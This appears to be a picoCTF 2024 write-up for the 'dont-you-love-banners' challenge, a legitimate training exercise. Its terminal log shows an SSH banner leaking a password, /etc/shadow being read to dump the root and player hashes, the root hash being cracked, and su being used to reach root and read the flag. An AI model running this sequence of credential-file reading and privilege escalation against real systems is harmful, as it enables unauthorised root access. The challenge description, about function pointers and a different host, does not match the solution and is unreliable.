
<!DOCTYPE html>
<html>

<body>
    <h1>dont-you-love-banners picoctf2024</h1>

    <h2>Challenge Description</h2>
    <p>   AUTHOR: ABRXS, PR1OR1TYQ

Description
Can you handle function pointers?
Download the binary <a href="https://artifacts.picoctf.net/c_mimas/49/chall">here</a> .
Download the source <a href="https://artifacts.picoctf.net/c_mimas/49/chall.c">here</a> .
Additional details will be available after launching your challenge instance.
-------------------------------------------------------
Connect with the challenge instance here:
nc mimas.picoctf.net 52816 
</p>
 
    <h2>Solution Approach</h2>
    <p>Here are the steps we took to solve the challenge:</p>
    <ol>
  we connect nc tethys.picoctf.net 52199 and see password needed to bec connect to 
nc tethys.picoctf.net 61399 and enter it and connect to that after answer some quetions 
and see can't use flag.txt that have no permissions  for us.so after some search see that can use this command for get password and export hash
(see <a href="https://phantom1ss.github.io/blog/2024/pico2024/dont-you-love-banners/root.bash">root.bash</a> for find correct value exported)
and after export value use it in john for get password and find flag
<pre>
┌──(kali㉿kali)-[~/…/blog/2024/pico2024/dont-you-love-banners]
└─$ nc tethys.picoctf.net 52199
SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234
                                                              
┌──(kali㉿kali)-[~/…/blog/2024/pico2024/dont-you-love-banners]
└─$ nc tethys.picoctf.net 61399
SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234
^Z
zsh: suspended  nc tethys.picoctf.net 61399
                                                              
┌──(kali㉿kali)-[~/…/blog/2024/pico2024/dont-you-love-banners]
└─$ nc tethys.picoctf.net 61423
*************************************
**************WELCOME****************
*************************************

what is the password? 
My_Passw@rd_@1234
What is the top cyber security conference in the world?

Lol, good try, try again and good luck

What is the top cyber security conference in the world?
defcon
the first hacker ever was known for phreaking(making free phone calls), who was it?
draper
player@challenge:~$ ls
ls
banner  text
player@challenge:~$ cat text
cat text
keep digging
player@challenge:~$ cat banner
cat banner
*************************************
**************WELCOME****************
*************************************
player@challenge:~$ cd /root
cd /root
player@challenge:/root$ ls 
ls
flag.txt  script.py
player@challenge:/root$ cat flag.txt
cat flag.txt
cat: flag.txt: Permission denied
player@challenge:/root$ cat /etc/shadow
cat /etc/shadow
root:$6$6QFbdp2H$R0BGBJtG0DlGFx9H0AjuQNOhlcssBxApM.CjDEiNzfYkVeJRNy2d98SDURNebD5/l4Hu2yyVk.ePLNEg/56DV0:19791:0:99999:7:::
daemon:*:19507:0:99999:7:::
bin:*:19507:0:99999:7:::
sys:*:19507:0:99999:7:::
sync:*:19507:0:99999:7:::
games:*:19507:0:99999:7:::
man:*:19507:0:99999:7:::
lp:*:19507:0:99999:7:::
mail:*:19507:0:99999:7:::
news:*:19507:0:99999:7:::
uucp:*:19507:0:99999:7:::
proxy:*:19507:0:99999:7:::
www-data:*:19507:0:99999:7:::
backup:*:19507:0:99999:7:::
list:*:19507:0:99999:7:::
irc:*:19507:0:99999:7:::
gnats:*:19507:0:99999:7:::
nobody:*:19507:0:99999:7:::
_apt:*:19507:0:99999:7:::
systemd-network:*:19791:0:99999:7:::
systemd-resolve:*:19791:0:99999:7:::
messagebus:*:19791:0:99999:7:::
sshd:*:19791:0:99999:7:::
player:$6$BCCW51fi$UI/5W01uG2.6EmxktMtZXbJQwrgDlv213cLwu7RxaIQHnRZXwKZ3yjuyNKf86KlSwbvAOp3YozpNVrBeKW9Ls0:19791:0:99999:7:::
player@challenge:/root$ cat flag.txt
cat flag.txt
cat: flag.txt: Permission denied
player@challenge:/root$ sudo cat flag.txt
sudo cat flag.txt
-su: sudo: command not found
player@challenge:/root$ bash
bash
player@challenge:/root$ cat flag.txt
cat flag.txt
cat: flag.txt: Permission denied
player@challenge:/root$ sudo
sudo
bash: sudo: command not found
player@challenge:/root$ su
su
Password: iloveyou

root@challenge:~# ls
ls
flag.txt  script.py
root@challenge:~# cat flag.txt
cat flag.txt
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_68ca8b23}
root@challenge:~#              
</pre>
and can see flag after run cat.
    </ol>
<br>
    <h2>Flag</h2>
    <p class="flag">picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_68ca8b23}
</p>

    <h2>Conclusion</h2>
    <p>this is a very   easy chanllenge for connect nc and find password and remove permissionwit connect to su  and get flag</p>
</body>
</html>

 


 



